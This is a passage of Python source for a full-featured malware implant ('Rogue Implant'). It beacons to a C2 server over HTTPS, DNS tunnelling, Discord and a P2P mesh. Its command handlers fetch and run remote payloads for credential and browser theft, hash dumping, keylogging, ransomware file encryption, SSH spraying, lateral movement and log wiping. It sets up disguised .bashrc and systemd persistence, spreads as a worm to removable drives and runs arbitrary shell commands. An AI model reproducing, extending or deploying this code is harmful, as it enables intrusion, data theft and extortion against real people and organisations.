        """Take screenshots"""
        parts = cmd.split()
        if len(parts) > 1 and parts[1] == "stop":
            print("[+] Stopping screenshot capture")
            return subprocess.getoutput("pgrep -f screenshot.py && pkill -f screenshot.py || echo '[-] No screenshot capture running.'")
        else:
            fetch_payload("screenshot.py")
            print("[+] Starting screenshot capture")
            # Start in background thread
            threading.Thread(target=lambda: run_payload("screenshot.py")).start()
            return "[*] Screenshot capture started in background"

    elif cmd.startswith("trigger_logclean"):
        """Clean system logs"""
        parts = cmd.split()
        if len(parts) > 1:
            fetch_payload("logcleaner.py")
            if parts[1] == "all":
                print("[+] Cleaning all logs")
                return subprocess.getoutput(f"python3 {os.path.join(HIDDEN_DIR, 'logcleaner.py')} --all")
            else:
                print(f"[+] Cleaning logs: {parts[1]}")
                return subprocess.getoutput(f"python3 {os.path.join(HIDDEN_DIR, 'logcleaner.py')} {parts[1]}")
        else:
            fetch_payload("logcleaner.py")
            print("[+] Cleaning implant logs")
            return run_payload("logcleaner.py")

    elif cmd.startswith("trigger_sshspray"):
        """SSH credential spraying attack"""
        fetch_payload("sshspray.py")
        parts = cmd.split()
        if len(parts) > 1:
            # Parse arguments: trigger_sshspray <target> <userlist> <passlist>
            if len(parts) >= 4:
                target = parts[1]
                userlist = parts[2]
                passlist = parts[3]
                print(f"[+] Starting SSH spray attack on {target}")
                return subprocess.getoutput(f"python3 {os.path.join(HIDDEN_DIR, 'sshspray.py')} {target} {userlist} {passlist}")
            else:
                return "[!] Usage: trigger_sshspray <target> <userlist> <passlist>"
        else:
            print("[+] Starting SSH spray with default settings")
            return run_payload("sshspray.py")

    elif cmd.startswith("trigger_dnstunnel"):
        """DNS tunneling C2 channel"""
        parts = cmd.split()
        if len(parts) > 1 and parts[1] == "stop":
            print("[+] Stopping DNS tunnel")
            return subprocess.getoutput("pgrep -f dnstunnel.py && pkill -f dnstunnel.py || echo '[-] No DNS tunnel running.'")
        else:
            fetch_payload("dnstunnel.py")
            print("[+] Starting DNS tunneling")
            # Start in background thread
            threading.Thread(target=lambda: run_payload("dnstunnel.py")).start()
            return "[*] DNS tunnel started in background"

    elif cmd == "trigger_autodeploy":
        """Auto-deploy to network"""
        fetch_payload("autodeploy.py")
        print("[+] Starting auto-deployment to network")
        # Start in background thread as it will take time
        threading.Thread(target=lambda: run_payload("autodeploy.py")).start()
        return "[*] Auto-deployment started in background"

    elif cmd == "trigger_network_scan":
        """Network scanning and host discovery"""
        fetch_payload("network_scanner.py")
        print("[+] Starting network scan")
        return run_payload("network_scanner.py")

    elif cmd == "trigger_persistence_setup":
        """Set up additional persistence mechanisms"""
        fetch_payload("persistence.py")
        print("[+] Setting up additional persistence")
        return run_payload("persistence.py")

    elif cmd == "trigger_defense_evasion":
        """Execute defense evasion techniques"""
        fetch_payload("defense_evasion.py")
        print("[+] Starting defense evasion")
        return run_payload("defense_evasion.py")

    elif cmd == "trigger_lateral_move":
        """Attempt lateral movement"""
        fetch_payload("lateral_movement.py")
        print("[+] Attempting lateral movement")
        return run_payload("lateral_movement.py")

    elif cmd == "trigger_forensics_check":
        """Check for forensic artifacts"""
        fetch_payload("forensics_check.py")
        print("[+] Checking for forensic artifacts")
        return run_payload("forensics_check.py")
    
    # === ADVANCED PAYLOADS - NEW ADDITIONS ===
    
    elif cmd == "trigger_procinject":
        """Process injection for stealth execution"""
        fetch_payload("process_inject.py")
        print("[+] Starting process injection module")
        return run_payload("process_inject.py")
    
    elif cmd == "trigger_filehide":
        """Advanced file hiding techniques"""
        fetch_payload("advanced_filehider.py")
        print("[+] Starting advanced file hiding")
        return run_payload("advanced_filehider.py")
    
    elif cmd == "trigger_cronpersist":
        """Advanced cron persistence methods"""
        fetch_payload("advanced_cron_persistence.py")
        print("[+] Setting up advanced cron persistence")
        return run_payload("advanced_cron_persistence.py")
    
    elif cmd == "trigger_compclean":
        """Competitor/malware cleaner"""
        fetch_payload("competitor_cleaner.py")
        print("[+] Starting competitor cleanup")
        return run_payload("competitor_cleaner.py")
    
    # === FILE ENCRYPTION PAYLOAD ===
    
    elif cmd.startswith("trigger_fileransom"):
        """File encryption/decryption ransomware"""
        parts = cmd.split()
        if len(parts) < 2:
            return "[!] Usage: trigger_fileransom <encrypt/decrypt> <path> [password] OR trigger_fileransom encrypt system_<mode> [password]"
        
        action = parts[1]
        fetch_payload("fileransom.py")
        
        # Build command for the payload
        payload_path = os.path.join(HIDDEN_DIR, "fileransom.py")
        
        if action == "encrypt":
            if len(parts) >= 3:
                target = parts[2]
                
                # Check for system-wide modes
                if target.startswith("system_"):
                    # System-wide encryption
                    mode = target
                    cmd_args = f"encrypt --mode {mode}"
                elif target == "all":
                    # Encrypt all user files
                    cmd_args = f"encrypt all"
                else:
                    # Normal path encryption
                    cmd_args = f"encrypt \"{target}\""
            else:
                cmd_args = "encrypt"
            
            # Optional custom password
            if len(parts) >= 4:
                password = parts[3]
                cmd_args += f" --custom-password \"{password}\""
            
            print(f"[+] Starting file encryption")
            return subprocess.getoutput(f"python3 \"{payload_path}\" {cmd_args}")
        
        elif action == "decrypt":
            if len(parts) < 3:
                return "[!] Usage: trigger_fileransom decrypt <path/system_wide> <password>"
            
            target = parts[2]
            
            if target == "system_wide":
                # System-wide decryption
                if len(parts) < 4:
                    return "[!] Usage: trigger_fileransom decrypt system_wide <password>"
                
                password = parts[3]
                cmd_args = f"decrypt system_wide --password \"{password}\""
            else:
                # Normal decryption
                if len(parts) < 4:
                    return "[!] Usage: trigger_fileransom decrypt <path> <password>"
                
                password = parts[3]
                cmd_args = f"decrypt \"{target}\" --password \"{password}\""
            
            print(f"[+] Starting file decryption")
            return subprocess.getoutput(f"python3 \"{payload_path}\" {cmd_args}")
        
        else:
            return "[!] Unknown action. Use 'encrypt' or 'decrypt'"
    
    # === COMPOUND TRIGGERS ===
    
    elif cmd == "trigger_full_recon":
        """Execute full reconnaissance suite"""
        print("[+] Starting full reconnaissance suite")
        results = []
        results.append("=== FULL RECONNAISSANCE SUITE ===")
        
        # System reconnaissance
        fetch_payload("sysrecon.py")
        results.append("\n[1] System Reconnaissance:")
        results.append(run_payload("sysrecon.py"))
        
        # Privilege escalation check
        fetch_payload("linpeas_light.py")
        results.append("\n[2] Privilege Escalation Check:")
        results.append(run_payload("linpeas_light.py"))
        
        # Hash dump
        fetch_payload("hashdump.py")
        results.append("\n[3] Password Hash Extraction:")
        results.append(run_payload("hashdump.py"))
        
        # Network scan
        fetch_payload("network_scanner.py")
        results.append("\n[4] Network Scan:")
        results.append(run_payload("network_scanner.py"))
        
        return "\n".join(results)

    elif cmd == "trigger_clean_sweep":
        """Clean all forensic traces and restart stealthily"""
        print("[+] Starting clean sweep operation")
        results = []
        
        # Clean logs first
        fetch_payload("logcleaner.py")
        results.append("[1] Cleaning logs:")
        results.append(run_payload("logcleaner.py"))
        
        # Defense evasion
        fetch_payload("defense_evasion.py")
        results.append("\n[2] Defense evasion:")
        results.append(run_payload("defense_evasion.py"))
        
        # Kill and restart implant
        results.append("\n[3] Restarting implant in stealth mode...")
        results.append("[+] Implant will restart after cleanup")
        
        return "\n".join(results)

    elif cmd == "trigger_harvest_all":
        """Harvest all possible data"""
        print("[+] Starting complete data harvesting")
        results = []
        results.append("=== COMPLETE DATA HARVEST ===")
        
        # Browser data
        fetch_payload("browserstealer.py")
        results.append("\n[1] Browser Data:")
        results.append(run_payload("browserstealer.py"))
        
        # Password hashes
        fetch_payload("hashdump.py")
        results.append("\n[2] Password Hashes:")
        results.append(run_payload("hashdump.py"))
        
        # SSH keys
        results.append("\n[3] SSH Keys:")
        ssh_keys = subprocess.getoutput("find /home /root -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' -o -name 'authorized_keys' 2>/dev/null")
        results.append(ssh_keys[:2000])
        
        # Configuration files
        results.append("\n[4] Configuration Files:")
        config_files = subprocess.getoutput("find /etc -name '*.conf' -o -name '*.cfg' -o -name '*.yml' -o -name '*.yaml' -o -name '*.json' 2>/dev/null | head -20")
        results.append(config_files)
        
        return "\n".join(results)

    # === UTILITY TRIGGERS ===
    
    elif cmd == "trigger_status":
        """Check implant status"""
        print("[+] Checking implant status")
        status = []
        status.append(f"Implant ID: {IMPLANT_ID_HASH}")
        status.append(f"C2 Server: {C2_HOST}")
        status.append(f"Hidden Directory: {HIDDEN_DIR}")
        status.append(f"Process Name: {subprocess.getoutput('ps -p $$ -o comm=')}")
        status.append(f"Uptime: {subprocess.getoutput('uptime')}")
        status.append(f"Memory Usage: {subprocess.getoutput('free -h | head -2')}")
        status.append(f"Network Connections: {len(subprocess.getoutput('netstat -tunap 2>/dev/null | grep ESTABLISHED').splitlines())} established")
        
        # Cloud info if available
        if cloud_implant.cloud_info and cloud_implant.cloud_info.get('is_cloud'):
            status.append(f"Cloud Environment: {cloud_implant.cloud_info.get('provider', 'unknown').upper()}")
            status.append(f"Cloud Type: {cloud_implant.cloud_info.get('type', 'unknown')}")
        
        # Check payloads
        payloads = os.listdir(HIDDEN_DIR) if os.path.exists(HIDDEN_DIR) else []
        python_payloads = [p for p in payloads if p.endswith('.py')]
        status.append(f"Available Payloads: {len(python_payloads)}")
        
        return "\n".join(status)

    elif cmd == "trigger_self_update":
        """Update the implant from C2"""
        print("[+] Starting self-update")
        try:
            # Download latest implant
            url = f"{PAYLOAD_REPO}rogue_implant.py"
            req = urllib.request.Request(
                url,
                headers={
                    'User-Agent': f'Rogue-Implant/{IMPLANT_ID_HASH}',
                    'X-Implant-ID': IMPLANT_ID_HASH
                }
            )
            response = urllib.request.urlopen(req, context=ssl_context, timeout=30)
            new_implant = response.read()
            
            # Save to temporary location
            temp_file = os.path.join(HIDDEN_DIR, "rogue_implant_new.py")
            with open(temp_file, 'wb') as f:
                f.write(new_implant)
            
            # Replace current implant
            current_file = __file__
            shutil.copy(temp_file, current_file)
            os.chmod(current_file, 0o755)
            os.remove(temp_file)
            
            return "[+] Implant updated successfully. Restart to apply changes."
        except Exception as e:
            return f"[!] Update failed: {e}"

    elif cmd == "trigger_help":
        """Show available triggers"""
        help_text = """
=== ROGUE IMPLANT TRIGGER COMMANDS ===

BASIC OPERATIONS:
  trigger_status           - Check implant status
  trigger_self_update      - Update implant from C2
  trigger_dumpcreds        - Dump credentials from common locations
  trigger_exfil <path>     - Exfiltrate data from specified path
  reverse_shell           - Start reverse shell to C2

CLOUD-AWARE OPERATIONS:
  trigger_cloud_detect    - Detect cloud environment
  trigger_cloud_recon     - Cloud-specific reconnaissance
  trigger_aws_creds       - Steal AWS credentials
  trigger_azure_creds     - Steal Azure credentials
  trigger_gcp_creds       - Steal GCP credentials
  trigger_container_escape - Attempt container escape
  trigger_k8s_creds       - Steal Kubernetes credentials
  trigger_k8s_steal       - Comprehensive Kubernetes secret stealing
  trigger_k8s_target <namespace> [secret] - Targeted Kubernetes secret stealing

RECONNAISSANCE & INTELLIGENCE:
  trigger_sysrecon        - System reconnaissance
  trigger_linpeas         - Linux privilege escalation check
  trigger_hashdump        - Password hash extraction
  trigger_browsersteal    - Browser data theft
  trigger_network_scan    - Network host discovery

ADVANCED PAYLOADS:
  trigger_procinject      - Process injection for stealth execution
  trigger_filehide        - Advanced file hiding techniques
  trigger_cronpersist     - Advanced cron persistence methods
  trigger_compclean       - Clean competitor malware/botnets
  trigger_fileransom encrypt <path> [password] - Encrypt files
  trigger_fileransom encrypt system_<mode> [password] - System-wide encryption
  trigger_fileransom encrypt all [password] - Encrypt all user files
  trigger_fileransom decrypt <path> <password> - Decrypt files
  trigger_fileransom decrypt system_wide <password> - System-wide decryption

MONITORING & COLLECTION:
  trigger_keylogger       - Start keystroke logging
  trigger_keylogger stop  - Stop keylogger
  trigger_screenshot      - Start screen capture
  trigger_screenshot stop - Stop screenshot capture

PERSISTENCE & STEALTH:
  trigger_stealthinject   - Execute polyroot persistence
  trigger_persistence_setup - Set up additional persistence
  trigger_defense_evasion - Execute defense evasion techniques
  trigger_logclean        - Clean system logs
  trigger_logclean all    - Clean all logs aggressively

LATERAL MOVEMENT:
  trigger_sshspray        - SSH credential spraying
  trigger_dnstunnel       - DNS tunneling C2
  trigger_autodeploy      - Auto-deploy to network
  trigger_lateral_move    - Attempt lateral movement

DDoS & CRYPTOMINING:
  trigger_ddos <target> <port> <duration> - DDoS attack
  trigger_mine            - Start cryptominer
  trigger_stopmine        - Stop cryptominer

COMPOUND OPERATIONS:
  trigger_full_recon      - Execute full reconnaissance suite
  trigger_clean_sweep     - Clean forensic traces and restart
  trigger_harvest_all     - Harvest all possible data

UTILITIES:
  trigger_forensics_check - Check for forensic artifacts
  trigger_help           - Show this help message

Use: load_payload <name.py> to download or run_payload <name.py> to execute
        """
        return help_text

    return None

def handle_command(cmd):
    if cmd.startswith("load_payload"):
        parts = cmd.split()
        if len(parts) < 2:
            return "[!] Usage: load_payload <filename>"
        payload_name = parts[1]
        result = fetch_payload(payload_name)
        return f"[+] Fetched {payload_name}" if result else f"[!] Failed to fetch {payload_name}"
    
    elif cmd.startswith("run_payload"):
        parts = cmd.split()
        if len(parts) < 2:
            return "[!] Usage: run_payload <filename>"
        return run_payload(parts[1])
    
    elif cmd.startswith("trigger_"):
        result = handle_trigger(cmd)
        return result if result else "[!] Trigger failed"
    
    elif cmd == "reverse_shell":
        print("[+] Starting reverse shell thread")
        threading.Thread(target=reverse_shell).start()
        return "[*] Reverse shell started"
    
    else:
        print(f"[+] Executing command: {cmd}")
        return subprocess.getoutput(cmd)

def beacon():
    """Main beacon loop using HTTPS - WITH VISIBLE OUTPUT WHEN MANUAL"""
    silent_mode = should_run_silently()
    
    if not silent_mode:
        print(f"[+] Starting HTTPS beacon to {C2_HOST}")
        print(f"[+] Implant ID: {IMPLANT_ID_HASH}")
    
    beacon_count = 0
    identified = False
    bot_id = None
    
    while True:
        try:
            beacon_count += 1
            
            if not silent_mode:
                print(f"[BEACON #{beacon_count}] Checking in...")
            
            response = send_https_command("beacon")
            
            if not silent_mode:
                print(f"[BEACON #{beacon_count}] Response: {response[:50]}...")
            
            if response and response != "pong":
                if response.startswith("identified:"):
                    bot_id = response.replace("identified:", "", 1)
                    identified = True
                    if not silent_mode:
                        print(f"[+] C2 identified us as: {bot_id}")
                else:
                    if not silent_mode:
                        print(f"[+] Received command: {response}")
                    result = handle_command(response)
                    if not silent_mode:
                        result_preview = result[:100] + "..." if len(result) > 100 else result
                        print(f"[+] Command result: {result_preview}")
                    
                    if result:
                        send_https_command(f"result:{result}")
            
            if not identified and beacon_count == 1:
                if not silent_mode:
                    print(f"[+] Sending identification to C2...")
                send_https_command(f"identify:{IMPLANT_ID_HASH}")
            
            if not silent_mode:
                print(f"[.] Next beacon in 30 seconds...")
            time.sleep(30)
            
        except Exception as e:
            if not silent_mode:
                print(f"[!] Beacon error: {e}")
                print(f"[!] Retrying in 60 seconds...")
            time.sleep(60)

def check_discord_command():
    """Check Discord for commands"""
    try:
        headers = {"Authorization": f"Bot {BOT_TOKEN}"}
        req = urllib.request.Request(DISCORD_COMMAND_URL, headers=headers)
        response = urllib.request.urlopen(req).read().decode()
        latest = json.loads(response)[0]["content"]
        return latest
    except Exception as e:
        print(f"[!] Discord command check failed: {e}")
        return None

def send_to_webhook(content):
    """Send result to Discord webhook"""
    try:
        req = urllib.request.Request(
            DISCORD_WEBHOOK,
            data=json.dumps({"content": content}).encode(),
            headers={"Content-Type": "application/json"},
            method='POST'
        )
        urllib.request.urlopen(req)
    except Exception as e:
        print(f"[!] Discord webhook send failed: {e}")

def discord_loop():
    """Discord fallback command loop (env-configured)"""
    silent_mode = should_run_silently()
    if not (DISCORD_COMMAND_URL and BOT_TOKEN and DISCORD_WEBHOOK):
        if not silent_mode:
            print("[!] Discord fallback disabled - set ROGUE_DISCORD_COMMAND_URL/TOKEN/WEBHOOK")
        return
    if not silent_mode:
        print("[+] Discord beacon active")
    
    last_cmd = ""
    
    while True:
        try:
            cmd = check_discord_command()
            if cmd and cmd != last_cmd:
                if not silent_mode:
                    print(f"[Discord] Received command: {cmd}")
                result = handle_command(cmd)
                encrypted_result = encrypt_response(result).decode()
                send_to_webhook(encrypted_result)
                last_cmd = cmd
        except Exception as e:
            if not silent_mode:
                print(f"[!] Discord loop error: {e}")
        
        time.sleep(30)

def fake_name():
    """Change process name for stealth"""
    try:
        import setproctitle
        setproctitle.setproctitle("systemd-journald")
        print("[+] Process name changed to systemd-journald")
    except:
        pass

def setup_persistence():
    """Set up stealthy persistence"""
    target = os.path.join(HIDDEN_DIR, ".rogue_agent.py")
    
    if not os.path.exists(target):
        shutil.copy(__file__, target)
        # carry v2 config so the persisted copy keeps its C2 identity
        try:
            cfg_here = os.path.join(os.path.dirname(os.path.abspath(__file__)), "rogue_v2_config.py")
            if os.path.exists(cfg_here):
                shutil.copy(cfg_here, os.path.join(HIDDEN_DIR, "rogue_v2_config.py"))
        except Exception:
            pass
        
        persistence_script = f'''if [ -z "${{ROGUE_LAUNCHED+x}}" ]; then
    export ROGUE_LAUNCHED=1
    (cd {HIDDEN_DIR} && nohup python3 {target} >/dev/null 2>&1 &)
fi'''
        
        bashrc_path = os.path.expanduser("~/.bashrc")
        if os.path.exists(bashrc_path):
            with open(bashrc_path, 'a') as f:
                f.write(f"\n# System journal service\n{persistence_script}\n")
            print(f"[+] Persistence installed to .bashrc")
        
        return True
    return False

def create_systemd_service(target_path):
    """Create a systemd service file for more robust persistence"""
    service_content = f"""[Unit]
Description=System Journal Service
After=network.target

[Service]
Type=simple
User={os.getlogin()}
WorkingDirectory={HIDDEN_DIR}
ExecStart=/usr/bin/python3 {target_path}
Restart=always
RestartSec=60
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
"""
    
    service_file = os.path.join(HIDDEN_DIR, "systemd-journald.service")
    with open(service_file, 'w') as f:
        f.write(service_content)
    
    install_script = os.path.join(HIDDEN_DIR, "install_service.sh")
    with open(install_script, 'w') as f:
        f.write(f"""#!/bin/bash
sudo cp {service_file} /etc/systemd/system/systemd-journald.service
sudo systemctl daemon-reload
sudo systemctl enable --now systemd-journald
""")
    os.chmod(install_script, 0o755)
    print(f"[+] Systemd service created: {service_file}")

def worm_propagate():
    """Worm propagation to removable drives"""
    try:
        drives = subprocess.getoutput("lsblk -o MOUNTPOINT -nr | grep -v '^$'").splitlines()
        for mount in drives:
            if "/media" in mount or "/run/media" in mount:
                try:
                    worm_dir = os.path.join(mount.strip(), ".rogue_worm")
                    os.makedirs(worm_dir, exist_ok=True)
                    shutil.copy(__file__, os.path.join(worm_dir, "rogue_implant.py"))
                    with open(os.path.join(worm_dir, ".bash_login"), "w") as f:
                        f.write(f"if [ -z \"${{ROGUE_WORM_LAUNCHED+x}}\" ]; then export ROGUE_WORM_LAUNCHED=1; (cd {worm_dir} && nohup python3 rogue_implant.py >/dev/null 2>&1 &); fi\n")
                    print(f"[+] Worm propagated to: {worm_dir}")
                except Exception as e:
                    print(f"[!] Worm propagation failed for {mount}: {e}")
    except Exception as e:
        print(f"[!] Worm propagation failed: {e}")

def p2p_listener():
    """P2P listener for bot communication"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    backup_ports = [7008, 7009, 7010, 7011]
    bound = False

    for port in backup_ports:
        try:
            sock.bind(('0.0.0.0', port))
            bound = True
            print(f"[+] P2P listener bound to port {port}")
            break
        except OSError:
            continue

    if not bound:
        print("[!] P2P listener failed to bind")
        return

    while True:
        try:
            data, addr = sock.recvfrom(1024)
            if data.decode() == "Rogue?":
                sock.sendto(b"I'm Rogue", addr)
                print(f"[P2P] Responded to query from {addr}")
        except:
            break

def p2p_broadcast():
    """P2P broadcast to find other bots"""
    ports = [7008, 7009, 7010, 7011]
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    while True:
        for port in ports:
            try:
                sock.sendto(b"Rogue?", ('<broadcast>', port))
            except:
                continue
        time.sleep(60)

def cleanup_old_persistence():
    """Remove old aggressive persistence from .bashrc"""
    rc_files = ['.bashrc', '.profile', '.bash_profile']
    for rc_file in rc_files:
        rc_path = os.path.expanduser(f"~/{rc_file}")
        if os.path.exists(rc_path):
            with open(rc_path, 'r') as f:
                lines = f.readlines()
            
            new_lines = [line for line in lines if 'rogue_agent.py' not in line and 'System maintenance' not in line]
            
            if len(new_lines) != len(lines):
                with open(rc_path, 'w') as f:
                    f.writelines(new_lines)
                print(f"[+] Cleaned old persistence from {rc_file}")

import random

# ============================================================================
# ROGUE V3.3 - LAYERED C2 COMMS
# ----------------------------------------------------------------------------
#   * config loader (rogue_v2_config.py sibling file / env / defaults)
#   * V2Comms: tiered transport manager with per-tier cooldowns + backoff
#       tier 0: HTTPS direct (multi-host failover)
#       tier 1: DNS tunnel (rv2_dns_tunnel_send -> operator DNS bridge)
#       tier 2: P2P mesh relay (encrypted UDP mesh, gateway nodes)
#   * always-on encrypted P2P mesh (discovery + relay + gateway flag)
#   * OOB inbound command channel (operator posts psk-sealed frames)
# All tiers carry identical end-to-end encrypted frames; no tier ever sees
# plaintext. Tier content cannot be read by relays.
# ============================================================================

V2_DEFAULTS = {
    "secret": "",            # operator secret (hex string or utf-8) - REQUIRED
    "static_pub": "",        # C2 X25519 static public key (base64)
    "c2_hosts": [],          # HTTPS C2 bases, tried in order: ["https://h1/"]
    "dns_zone": "",          # operator DNS zone, e.g. "c2.example.com"
    "dns_resolver": "",      # operator DNS bridge IP (authoritative)
    "dns_port": 53,
    "oob_read_url": "",      # channel URL for inbound commands (discord api)
    "oob_webhook": "",       # webhook URL for outbound results
    "oob_token": "",         # bot token for channel reads
    "p2p_ports": (7008, 7009, 7010, 7011),
    "legacy_fallback": True,  # allow legacy plaintext discord commands too
}


def _v2_load_config():
    """Merge order: sibling rogue_v2_config.py > ROGUE_* env vars > defaults."""
    cfg = dict(V2_DEFAULTS)
    try:
        import importlib.util
        p = os.path.join(os.path.dirname(os.path.abspath(__file__)), "rogue_v2_config.py")
        if os.path.exists(p):
            spec = importlib.util.spec_from_file_location("rogue_v2_config", p)
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
            for k in cfg:
                if hasattr(mod, k):
                    cfg[k] = getattr(mod, k)
    except Exception:
        pass
    envmap = {
        "ROGUE_SECRET": "secret", "ROGUE_STATIC_PUBLIC": "static_pub",
        "ROGUE_C2_HOSTS": "c2_hosts", "ROGUE_DNS_ZONE": "dns_zone",
        "ROGUE_DNS_RESOLVER": "dns_resolver", "ROGUE_OOB_READ_URL": "oob_read_url",
        "ROGUE_OOB_WEBHOOK": "oob_webhook", "ROGUE_OOB_TOKEN": "oob_token",
    }
    for env, k in envmap.items():
        if os.environ.get(env):
            cfg[k] = os.environ[env]
    if isinstance(cfg.get("c2_hosts"), str):
        cfg["c2_hosts"] = [h.strip() for h in cfg["c2_hosts"].split(",") if h.strip()]
    if isinstance(cfg.get("p2p_ports"), str):
        cfg["p2p_ports"] = tuple(int(x) for x in cfg["p2p_ports"].split(",") if x.strip())
    return cfg


ROGUE_V2_CFG = _v2_load_config()
V2_ENABLED = bool(ROGUE_V2_CFG.get("secret"))

# per-install identity nonce: cloned images / pid reuse / reboots would
# otherwise produce colliding implant ids (and mesh labels)
_ROGUE_NONCE = ""
try:
    _npath = os.path.join(HIDDEN_DIR, ".rogue_nonce")
    if os.path.exists(_npath):
        _ROGUE_NONCE = open(_npath).read().strip()
    else:
        _ROGUE_NONCE = rv2_rand(4).hex()
        open(_npath, "w").write(_ROGUE_NONCE)
except Exception:
    _ROGUE_NONCE = rv2_rand(4).hex() if V2_ENABLED else ""
V2_IDENTITY = (IMPLANT_ID_HASH + "_" + _ROGUE_NONCE) if V2_ENABLED else IMPLANT_ID_HASH
V2_LABEL = rv2_label(ROGUE_V2_CFG.get("secret") or "x", IMPLANT_ID_HASH) if V2_ENABLED else ""


class V2Comms(object):
    """Tiered, layered transport manager for one implant."""

    TIER_HTTP = "http"
    TIER_DNS = "dns"
    TIER_P2P = "p2p"
    TIER_ORDER = (TIER_HTTP, TIER_DNS, TIER_P2P)
    COOLDOWN = {TIER_HTTP: 20, TIER_DNS: 45, TIER_P2P: 15}

    def __init__(self, cfg, implant_id=None):
        self.cfg = cfg
        self.implant_id = implant_id or V2_IDENTITY
        self.client = None
        self.mesh = None
        self.lock = threading.Lock()
        self._await = None          # threading.Event for p2p responses
        self._await_resp = None
        self._cooldown = {}
        self._fail_streak = 0
        self._gw_ok = False
        self._http_ok_ts = 0
        self._oob_seen = set()
        self._session_attempts = 0

    # -- session / crypto ------------------------------------------------
    def _ensure_client(self):
        c = self.client
        if c is None or c.rekey_needed():
            c = RogueV2Client(self.cfg["secret"], self.cfg.get("static_pub") or None,
                              implant_id=self.implant_id)
            self.client = c
        return c

    def _do_hello(self, c):
        """Send hello through tiers until a hello_ack returns."""
        hello_raw = c.build_hello()
        for tier in self.TIER_ORDER:
            if not self._tier_allowed(tier):
                continue
            resp = self._tier_send_raw(tier, hello_raw, hello=True)
            if resp:
                try:
                    c.handle_hello_ack(resp)
                    return True
                except Exception:
                    continue
        return False

    # -- tier plumbing ----------------------------------------------------
    def _tier_allowed(self, tier):
        if tier == self.TIER_P2P and (self.mesh is None or not self.mesh.peers):
            return False
        if tier == self.TIER_DNS and not (self.cfg.get("dns_zone") and self.cfg.get("dns_resolver")):
            return False
        return time.time() >= self._cooldown.get(tier, 0)

    def _note_fail(self, tier):
        self._cooldown[tier] = time.time() + self.COOLDOWN.get(tier, 30)
        self._fail_streak += 1

    def _note_ok(self):
        self._fail_streak = 0

    def _http_post(self, raw):
        if not self.cfg.get("c2_hosts"):
            return None
        for base in self.cfg["c2_hosts"]:
            try:
                req = urllib.request.Request(
                    base.rstrip("/") + "/", data=raw, method="POST",
                    headers={"Content-Type": "application/octet-stream",
                             "User-Agent": "Rogue-Implant/%s" % IMPLANT_ID_HASH})
                with urllib.request.urlopen(req, context=ssl_context, timeout=25) as r:
                    return r.read()
            except Exception:
                continue
        return None

    def _dns_post(self, raw):
        try:
            return rv2_dns_tunnel_send(raw, self.cfg["dns_zone"], self.cfg["dns_resolver"],
                                       resolver_port=int(self.cfg.get("dns_port", 53)))
        except Exception:
            return None

    def _p2p_post(self, raw):
        if self.mesh is None:
            return None
        ev = threading.Event()
        box = {}
        def _on_me(resp_raw):
            box["resp"] = resp_raw
            ev.set()
        old = self.mesh.on_me
        self.mesh.on_me = _on_me
        try:
            if not self.mesh.send_data(raw, rv2_root_label(self.cfg["secret"])):
                return None
            ev.wait(timeout=18)
            return box.get("resp")
        finally:
            self.mesh.on_me = old

    def _tier_send_raw(self, tier, raw, hello=False):
        fn = {self.TIER_HTTP: self._http_post,
              self.TIER_DNS: self._dns_post,
              self.TIER_P2P: self._p2p_post}.get(tier)
        if not fn:
            return None
        try:
            resp = fn(raw)
        except Exception:
            resp = None
        if resp:
            if tier == self.TIER_HTTP:
                self._http_ok_ts = time.time()
                self._gw_ok = True
                if self.mesh:
                    self.mesh.set_gateway(True)
            self._note_ok()
            return resp
        self._note_fail(tier)
        return None

    # -- public op API ----------------------------------------------------
    def roundtrip(self, opdict, retries=2):
        """Send one op (beacon/result/...) to the C2, get the response opdict.
        Returns None if every tier failed this cycle."""
        c = self._ensure_client()
        for attempt in range(retries):
            if not c.is_ready() or self._session_attempts == 0:
                if not self._do_hello(c):
                    # all tiers failed during hello
                    if attempt == retries - 1:
                        self._gw_ok = False
                        if self.mesh:
                            self.mesh.set_gateway(False)
                        return None
                    continue
                self._session_attempts += 1
            if not c.is_ready():
                self._gw_ok = False
                return None
            raw = c.seal_op(opdict)
            for tier in self.TIER_ORDER:
                if not self._tier_allowed(tier):
                    continue
                resp = self._tier_send_raw(tier, raw)
                if resp:
                    try:
                        return c.open_op(resp)
                    except Exception:
                        continue
            # not delivered anywhere this pass
            if self._fail_streak >= 6:
                self._gw_ok = False
                if self.mesh:
                    self.mesh.set_gateway(False)
        return None

    def send_plain(self, op_str):
        """Fire-and-forget an op string via the best tier (used by OOB + exfil)."""
        return self.roundtrip({"o": op_str})

    # -- mesh --------------------------------------------------------------
    def start_mesh(self):
        if self.mesh or not V2_ENABLED:
            return
        my_label = rv2_label(self.cfg["secret"], self.implant_id)
        self.mesh = RogueMesh(self.cfg["secret"], my_label,
                              ports=tuple(self.cfg.get("p2p_ports") or (7008,)),
                              announce_interval=45,
                              on_root=self._mesh_root, on_me=None,
                              log=lambda *a: None)
        self.mesh.start()

    def _mesh_root(self, raw):
        """Gateway path: a peer relayed an E2E frame destined for the C2."""
        return self._http_post(raw)

    def update_gw(self, ok):
        self._gw_ok = ok
        if self.mesh:
            self.mesh.set_gateway(ok)

    def mesh_peer_count(self):
        return len(self.mesh.peers) if self.mesh else 0

    def merge_peers(self, labels):
        """Apply a peer list pushed by the C2 (labels we should expect)."""
        # The C2 pushes labels so we can validate route targets; actual addrs
        # still come from encrypted announces. Nothing to store here for v3.3
        # beyond warming: if we have no peers and got a list, announce sooner.
        if self.mesh and labels and not self.mesh.peers:
            self.mesh.send_announce()

    # -- OOB inbound commands (operator -> implant, psk-sealed) -------------
    def oob_poll_once(self):
        """Read latest channel message; if it is a sealed command, run it."""
        if not (self.cfg.get("oob_read_url") and self.cfg.get("oob_token")):
            return
        try:
            req = urllib.request.Request(self.cfg["oob_read_url"],
                                         headers={"Authorization": "Bot %s" % self.cfg["oob_token"]})
            with urllib.request.urlopen(req, timeout=15) as r:
                msgs = json.loads(r.read().decode())
            content = (msgs[0] or {}).get("content", "") if isinstance(msgs, list) else ""
            if not content:
                return
            try:
                inner = rv2_oob_open(self.cfg["secret"], content.strip(), seen=self._oob_seen)
            except Exception:
                if self.cfg.get("legacy_fallback"):
                    # older-style plaintext channel commands (compat mode)
